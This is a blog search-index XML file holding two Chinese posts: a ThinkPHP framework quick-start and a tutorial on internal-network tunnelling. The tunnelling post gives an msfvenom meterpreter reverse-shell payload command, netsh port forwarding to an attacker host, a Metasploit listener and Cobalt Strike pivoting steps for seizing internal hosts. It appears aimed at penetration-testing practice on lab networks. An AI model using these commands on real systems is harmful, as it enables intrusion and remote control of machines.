<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>快速入门使用thinkPHP</title>
    <link href="/2023/03/03/thinkphp/"/>
    <url>/2023/03/03/thinkphp/</url>
    
    <content type="html"><![CDATA[<h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><p>​     thinkPHP框架是基于MVC设计模式的轻量型web应用程序框架，是PHP语言开发的主流框架之一</p><h3 id="应用目录结构说明"><a href="#应用目录结构说明" class="headerlink" title="应用目录结构说明"></a>应用目录结构说明</h3><p><em>基于该框架开发的web应用程序目录遵循如下目录结构</em>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs stylus">project  应用部署目录<br>├─application           应用目录（可设置）<br>│  ├─common             公共模块目录（可更改）<br>│  ├─index              模块目录(可更改)<br>│  │  ├─config<span class="hljs-selector-class">.php</span>      模块配置文件<br>│  │  ├─common<span class="hljs-selector-class">.php</span>      模块函数文件<br>│  │  ├─controller      控制器目录<br>│  │  ├─model           模型目录<br>│  │  ├─view            视图目录<br>│  │  └─ ...            更多类库目录<br>│  ├─command<span class="hljs-selector-class">.php</span>        命令行工具配置文件<br>│  ├─common<span class="hljs-selector-class">.php</span>         应用公共（函数）文件<br>│  ├─config<span class="hljs-selector-class">.php</span>         应用（公共）配置文件<br>│  ├─database<span class="hljs-selector-class">.php</span>       数据库配置文件<br>│  ├─tags<span class="hljs-selector-class">.php</span>           应用行为扩展定义文件<br>│  └─route<span class="hljs-selector-class">.php</span>          路由配置文件<br>├─extend                扩展类库目录（可定义）<br>├─public                WEB 部署目录（对外访问目录）<br>│  ├─static             静态资源存放目录(css,js,image)<br>│  ├─index<span class="hljs-selector-class">.php</span>          应用入口文件<br>│  ├─router<span class="hljs-selector-class">.php</span>         快速测试文件<br>│  └─<span class="hljs-selector-class">.htaccess</span>          用于 apache 的重写<br>├─runtime               应用的运行时目录（可写，可设置）<br>├─vendor                第三方类库目录（Composer）<br>├─thinkphp              框架系统目录<br>│  ├─lang               语言包目录<br>│  ├─library            框架核心类库目录<br>│  │  ├─think           Think 类库包目录<br>│  │  └─traits          系统 Traits 目录<br>│  ├─tpl                系统模板目录<br>│  ├─<span class="hljs-selector-class">.htaccess</span>          用于 apache 的重写<br>│  ├─<span class="hljs-selector-class">.travis</span><span class="hljs-selector-class">.yml</span>        CI 定义文件<br>│  ├─base<span class="hljs-selector-class">.php</span>           基础定义文件<br>│  ├─composer<span class="hljs-selector-class">.json</span>      composer 定义文件<br>│  ├─console<span class="hljs-selector-class">.php</span>        控制台入口文件<br>│  ├─convention<span class="hljs-selector-class">.php</span>     惯例配置文件<br>│  ├─helper<span class="hljs-selector-class">.php</span>         助手函数文件（可选）<br>│  ├─LICENSE<span class="hljs-selector-class">.txt</span>        授权说明文件<br>│  ├─phpunit<span class="hljs-selector-class">.xml</span>        单元测试配置文件<br>│  ├─README<span class="hljs-selector-class">.md</span>          README 文件<br>│  └─start<span class="hljs-selector-class">.php</span>          框架引导文件<br>├─build<span class="hljs-selector-class">.php</span>             自动生成定义文件（参考）<br>├─composer<span class="hljs-selector-class">.json</span>         composer 定义文件<br>├─LICENSE<span class="hljs-selector-class">.txt</span>           授权说明文件<br>├─README<span class="hljs-selector-class">.md</span>             README 文件<br>├─think                 命令行入口文件<br></code></pre></td></tr></table></figure><h3 id="下载途径"><a href="#下载途径" class="headerlink" title="下载途径"></a>下载途径</h3><p>​     <em>使用thinkphp开发web应用很简单，下载thinkPHP框架的官方相关文件</em></p><hr><p>应用项目: <a href="https://github.com/top-think/think">https://github.com/top-think/think</a></p><p>核心框架: <a href="https://github.com/top-think/framework">https://github.com/top-think/framework</a></p><hr><h3 id="demo演示说明"><a href="#demo演示说明" class="headerlink" title="demo演示说明"></a>demo演示说明</h3><p>​       这两个文件下载下来解压缩后，将核心框架文件重命名为thinkphp，添加到应用项目的根目录中，修改后的项目目录结构如下图所示：</p><p><img src="/images/fe6c4447646f2b3f0d5b8065176f875.png" alt="fe6c4447646f2b3f0d5b8065176f875"></p><p>​       如下介绍thinkphp的各个结构模块的作用，以及编写方式，完整详细的教程请参考官方的文档说明，这里仅作简要说明，帮助快速入门理解该框架概念思想。</p><h3 id="MVC模式概念"><a href="#MVC模式概念" class="headerlink" title="MVC模式概念"></a>MVC模式概念</h3><p>​      MVC各个字母含义是M(Model 模型)、V（View 视图）C（Controller 控制器） ，基于MVC模式开发的web应用程序会将用户请求交给控制器，由控制器负责是否响应用户请求，并将请求转交给相应的模型进行处理（这里的模型可以理解为web应用中的业务逻辑），模型部分将用户请求的资源返回给控制器后，再由控制器根据具体情况将服务器响应内容通过视图渲染后，或者直接不渲染发送给用户浏览器上。spring MVC 、thinkPHP　都是MVC设计思想的具体体现。这里以thinkPHP５的TLS版本进行说明演示。</p><h3 id="TP框架各部分说明演示"><a href="#TP框架各部分说明演示" class="headerlink" title="TP框架各部分说明演示"></a>TP框架各部分说明演示</h3><h4 id="路由模块"><a href="#路由模块" class="headerlink" title="路由模块"></a>路由模块</h4><p>​      thinkPHP框架通过路由来决定如何响应用户的请求，通过用户输入的相关参数确定是否在响应的范围内，并根据用户的请求内容路由到控制器，或者响应输出相对应的业务逻辑处理后的结果等。</p><p><strong>我们通过修改route.php文件的内容来配置路由</strong></p><p><em>路由配置的一般格式：</em></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Route</span>::请求方式(<span class="hljs-string">&#x27;请求字符串/:请求参数名&#x27;</span>, <span class="hljs-string">&#x27; 模块/控制器/操作&#x27;</span>)<br></code></pre></td></tr></table></figure><p>例如在route.php中添加如下一行：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Route::<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;look/:see&#x27;</span>,<span class="hljs-string">&#x27;test/test/hello&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">表示通过GET请求，访问http://URL/look/<span class="hljs-comment">###/ 会路由到test控制器的hello操作</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当访问 http://localhost.com/look/123(任意字符串) 时，会路由到<span class="hljs-built_in">test</span>模块的<span class="hljs-built_in">test</span>控制器的hello方法进行处理</span><br></code></pre></td></tr></table></figure><h4 id="控制器模块"><a href="#控制器模块" class="headerlink" title="控制器模块"></a>控制器模块</h4><p>​       负责响应相关的用户请求，将业务逻辑处理后的数据返回给用户</p><p><strong>示例：</strong></p><p>​        在应用的application目录下的相对应模块目录下的Controller目录进行控制器的相应配置，例如下图：</p><p><img src="/images/304b41f31386ef4054deb61063539a6.png" alt="304b41f31386ef4054deb61063539a6"></p><p>​该图所示的Test.php表示名为Test的控制器，其中的文件内容是相关的控制逻辑实现。</p><p>​向该文件添加如下代码字段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">test</span>\<span class="hljs-title class_">controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$request</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;request=<span class="hljs-variable">$request</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$see</span> = <span class="hljs-string">&#x27;ThinkPHP5&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;参数为：&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">host</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello1</span>(<span class="hljs-params"><span class="hljs-variable">$see</span> = <span class="hljs-string">&#x27;ThinkPHP5&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    &#125;     <br>&#125;<br></code></pre></td></tr></table></figure><hr><p>​使用小皮面板部署该web应用程序，网站根目录设置为public目录</p><p>​访问  <a href="http://172.16.202.131/public/look/123"></a> 页面结果如下所示：</p><p><img src="/images/deffe4d854eb2130cdfd99a1799701e.png" alt="deffe4d854eb2130cdfd99a1799701e"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#显示的是服务器的IP地址；</span><br></code></pre></td></tr></table></figure><h4 id="模型模块"><a href="#模型模块" class="headerlink" title="模型模块"></a>模型模块</h4><p>​thinkPHP里面的模型绝大多数是对数据库进行操作的业务逻辑，模型可理解为网站相应页面的参数聚合，保存在数据库中，通过模型进行规范化操作。例如新闻页的标签，题目，标题，主题，关键字等，将这些部分转为数据库的字段进行保存，通过模型进行修改操作。</p><h4 id="视图模块"><a href="#视图模块" class="headerlink" title="视图模块"></a>视图模块</h4><p>​负责将返回浏览器的数据进行渲染处理。视图部分跟控制器在同一目录（模块）下。</p><p>​</p><p>​<em><strong>例如下图所示:</strong></em></p><p><img src="/images/998f4ea3f8d0c0d6b99f8d9967c55b1.png" alt="998f4ea3f8d0c0d6b99f8d9967c55b1"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">如果需要将用户输出数据通过视图渲染后返回，可以通过修改控制器的操作方法来实现。<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><p>​在路由（route.php）中添加路由规则</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Route::<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;item/:name&#x27;</span>, <span class="hljs-string">&#x27;index/index/index&#x27;</span>);<br></code></pre></td></tr></table></figure><p>​创建控制器Index.php并添加操作方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#所在目录为：</span><br><span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/tp/</span>application<span class="hljs-regexp">/index/</span>controller/<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">View</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;ThinkPHP&#x27;</span>);<br>        <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;email&#x27;</span>,<span class="hljs-string">&#x27;thinkphp@qq.com&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>​创建视图文件(index.html)，并向其中写入以下内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#这里的视图文件目录为:</span><br><span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/tp/</span>application<span class="hljs-regexp">/index/</span>view<span class="hljs-regexp">/index/</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个标题&#123;$name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落.&#123;$email&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​以上步骤完成后，访问相对应的网址</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#这里的网址为：http:<span class="hljs-comment">//172.16.202.131/item/test</span></span><br></code></pre></td></tr></table></figure><p>​页面显示如下所示：</p><p><img src="/images/bb1ae019952c36c723658b1b81c33ee.png" alt="bb1ae019952c36c723658b1b81c33ee"></p><h4 id="数据库模块"><a href="#数据库模块" class="headerlink" title="数据库模块"></a>数据库模块</h4><p>​thinkPHP对数据库的操作通过链式调用的方式进行操作，而且对查询参数进行了预处理。待补充。。。。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>TP框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见内网隧道搭建技术总结</title>
    <link href="/2023/02/17/suidao/"/>
    <url>/2023/02/17/suidao/</url>
    
    <content type="html"><![CDATA[<h1 id="隧道应用"><a href="#隧道应用" class="headerlink" title="隧道应用"></a>隧道应用</h1><p>端口映射</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">是指将一台主机的内网（LAN）<span class="hljs-built_in">IP</span> 地址映射成一个公网（WAN）<span class="hljs-built_in">IP</span> 地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网 <span class="hljs-built_in">IP</span> 地址机器的多<br>个端口映射到内网不同机器上的不同端口。<br></code></pre></td></tr></table></figure><p>端口映射与端口转发</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">端口映射与端口转发，用于发布防火墙内部的服务器或者防火墙内部的客户端计算机，有的路由器也有端口映射与端口转发功能。端口映射与端口转发实现的功能类似，但又不完全一样。端口映射是将外网的一个端口完全映射给内网一个地址的指定端口，而端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口。端口映射可以实现外网到内网和内网到外网双向的通信，而映射转发只能实现外网到内网的单向通信 。<br></code></pre></td></tr></table></figure><h4 id="netsh-端口映射"><a href="#netsh-端口映射" class="headerlink" title="netsh  端口映射"></a>netsh  端口映射</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netsh</span> 是 windows 系统自带的一个命令行工具，这个工具可以内置中端口转发功能。<br></code></pre></td></tr></table></figure><p>我们看一下一个常见的场景:</p><p><img src="/images/image-20220221145814373.png" alt="image-20220221145814373"></p><p>思考:</p><p>​A想访问C , 能访问到吗?</p><p>设置转发:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=本机设置的端口 <span class="hljs-attribute">connectaddress</span>=C服务<br>器(ip) <span class="hljs-attribute">connectport</span>=C需要转发的端口<br><br>netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=7777 <span class="hljs-attribute">connectaddress</span>=10.10.10.26<br><span class="hljs-attribute">connectport</span>=80<br></code></pre></td></tr></table></figure><p>访问 192.168.127.156:7777 即可获取C服务器上的端口内容**(如果访问不了,关闭B服务器防火墙或者对7777实行放行规则**)</p><p><img src="/images/image-20220221150319831.png" alt="image-20220221150319831"></p><p>清除规则指定规则</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">delete</span> <span class="hljs-symbol">v4tov4</span> <span class="hljs-symbol">listenport</span>=<span class="hljs-symbol">7777</span><br></code></pre></td></tr></table></figure><p>查看转发规则</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">all</span><br></code></pre></td></tr></table></figure><p>清除所有规则</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></td></tr></table></figure><h4 id="netsh-端口转发监听-metperter"><a href="#netsh-端口转发监听-metperter" class="headerlink" title="netsh  端口转发监听 metperter"></a>netsh  端口转发监听 metperter</h4><p><img src="/images/image-20220221162940938.png" alt="image-20220221162940938"></p><p>思考:<br>            攻击机能否生成木马给C,C执行后能否获取到shell</p><p>MSF生成木马:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.10.27 <span class="hljs-attribute">LPORT</span>=4455 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>在B服务器尚设置端口转发:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=4455 <span class="hljs-attribute">connectaddress</span>=192.168.127.141 <span class="hljs-attribute">connectport</span>=4455<br>#访问B主机的4455就把流量转发给kali攻击机<br></code></pre></td></tr></table></figure><p>kali设置监听:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use windows/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.127.141</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4445</span><br></code></pre></td></tr></table></figure><p>在 C 服务器上执行后门,即可获取 metperte:</p><p><img src="/images/image-20220221155835370-16673890408275.png" alt="image-20220221155835370"></p><h4 id="cobalt-strike正向连接多层内网"><a href="#cobalt-strike正向连接多层内网" class="headerlink" title="cobalt strike正向连接多层内网"></a>cobalt strike正向连接多层内网</h4><p><img src="/images/image-20220221145814373-16673890985377.png" alt="image-20220221145814373"></p><p>条件:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>主机上面运行了CS服务端与客户端<br><span class="hljs-number">2</span>. <span class="hljs-selector-tag">B</span>服务器已经被<span class="hljs-selector-tag">A</span>控制<br>需求:需要获取C主机的控制权限<br></code></pre></td></tr></table></figure><p>第一步:创建正向连接监听器:</p><p><img src="/images/image-20220221164257629.png" alt="image-20220221164257629"></p><p>第二步:生成木马时( S ),选择正向连接的监听器</p><p><img src="/images/image-20220221164407929.png" alt="image-20220221164407929"></p><p>第三步:在C主机执行木马后,进入B主机的Beacon执行连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">connect</span> <span class="hljs-number">10.10.10.26</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>第四步:成功连接</p><p><img src="/images/image-20220221164730379.png" alt="image-20220221164730379"></p><h4 id="cobalt-strike反向连接多层内网"><a href="#cobalt-strike反向连接多层内网" class="headerlink" title="cobalt strike反向连接多层内网:"></a>cobalt strike反向连接多层内网:</h4><p><img src="/images/image-20220221162940938-166738918282412.png" alt="image-20220221162940938"></p><p>条件:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>主机上面运行了CS服务端与客户端<br><span class="hljs-number">2</span>. <span class="hljs-selector-tag">B</span>服务器已经被<span class="hljs-selector-tag">A</span>控制<br><span class="hljs-number">3</span>. C服务器开启了防火墙功能<br>需求:需要获取C主机的控制权限<br></code></pre></td></tr></table></figure><p>第一步:把B服务器的端口转发给A,只要C访问B,B就转发流量到A:</p><p><img src="/images/image-20220221165904106.png" alt="image-20220221165904106"></p><p><img src="/images/image-20220221165830603.png" alt="image-20220221165830603"></p><p>第二步:生成木马时选择刚刚创建好的监听器</p><p><img src="/images/image-20220221170117046.png" alt="image-20220221170117046"></p><p>第三步:C主机执行刚刚生成的木马</p><p><img src="/images/image-20220221164730379-166738923959117.png" alt="image-20220221164730379"></p><h4 id="Burp-Suite设置上游代理访问内网"><a href="#Burp-Suite设置上游代理访问内网" class="headerlink" title="Burp Suite设置上游代理访问内网"></a>Burp Suite设置上游代理访问内网</h4><p><img src="/images/image-20220222095034593.png" alt="image-20220222095034593"></p><p>条件:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span>服务器<span class="hljs-punctuation">(</span>攻击者<span class="hljs-punctuation">)</span><br><span class="hljs-variable">B</span>服务器<span class="hljs-punctuation">(</span>沦陷<span class="hljs-punctuation">)</span><br><span class="hljs-built_in">C</span>服务器<span class="hljs-punctuation">(</span>数据库服务器<span class="hljs-operator">,</span>未沦陷<span class="hljs-punctuation">)</span><br><span class="hljs-built_in">D</span>服务器<span class="hljs-punctuation">(</span><span class="hljs-variable">BP</span>抓包软件安装处<span class="hljs-punctuation">)</span><br><br><span class="hljs-variable">A</span><span class="hljs-punctuation">(</span>攻击者<span class="hljs-punctuation">)</span>已获得<span class="hljs-variable">B</span>服务器权限<span class="hljs-operator">,</span>并开启代理后通过<span class="hljs-variable">B</span>访问到<span class="hljs-built_in">C</span>服务器<span class="hljs-operator">,</span>现在<span class="hljs-built_in">C</span>服务器有网站可以渗透<span class="hljs-operator">,</span>需要使用<span class="hljs-variable">BP</span>进行抓包修改参数<span class="hljs-operator">,</span>应该怎么操作<span class="hljs-operator">,</span>才可以使<span class="hljs-built_in">D</span>服务器能抓取<span class="hljs-built_in">C</span>服务器的数据包<span class="hljs-operator">.</span><br></code></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当 <span class="hljs-variable">kali</span> 获得服务器 <span class="hljs-variable">B</span> 得 <span class="hljs-variable">meterperter</span> 后，可以通过设置 <span class="hljs-variable">socks4</span><span class="hljs-operator">/</span><span class="hljs-number">5</span> 代理通过在 <span class="hljs-variable">A</span> 服务器上配置 <span class="hljs-variable">proxychains</span> 能让 <span class="hljs-built_in">D</span> 访问 <span class="hljs-built_in">C</span> 服务器的 <span class="hljs-number">80</span> 端口。<br>当 <span class="hljs-built_in">D</span> 设置浏览器代理，访问 <span class="hljs-built_in">C</span> 的时候 实际上是 <span class="hljs-built_in">D</span> 通过代理访问 <span class="hljs-variable">A</span> 的 <span class="hljs-number">1080</span> 端口转发到 <span class="hljs-built_in">C</span> 的 <span class="hljs-number">80</span> 端口上。因为浏览器已经设置代理了，<span class="hljs-variable">burpsuite</span> 无法再使用浏览器代理，在这种情况下，<span class="hljs-variable">bursuite</span> 要想使用浏览器代理抓包，可以在 <span class="hljs-variable">burpsuite</span> 代理模块指定代理 <span class="hljs-variable">A</span> 的代理信息，但是 <span class="hljs-variable">burpsuite</span> 不支持 <span class="hljs-variable">socks4</span><span class="hljs-operator">/</span><span class="hljs-number">5</span> 代理。可以考虑使用 <span class="hljs-variable">burpsuite</span> 的上游代理设置为系统代理，再通过代理访问 <span class="hljs-variable">kali</span> 再经过 <span class="hljs-variable">B</span> 服务器即可访问 <span class="hljs-built_in">C</span> 的 <span class="hljs-number">80</span> 端口 <br></code></pre></td></tr></table></figure><p>第一步:A上面生成木马给B服务器并进行连接</p><p>第二步:在msf页面加载路由,退出后加载socks模块,并且修改proxychins的配置文件 192.168.127.141 1080</p><p>第三步:在D主机上使用sockscap64软件,填写好相关代理配置,并在右下角菜单栏切换为系统代理</p><p>第四步:在BURP的User options设置 upstream Proxy Servers ,端口为25378,因为sockscap的默认系统代理端口就是25378</p><p><img src="/images/image-20220222100135637.png" alt="image-20220222100135637"></p><h4 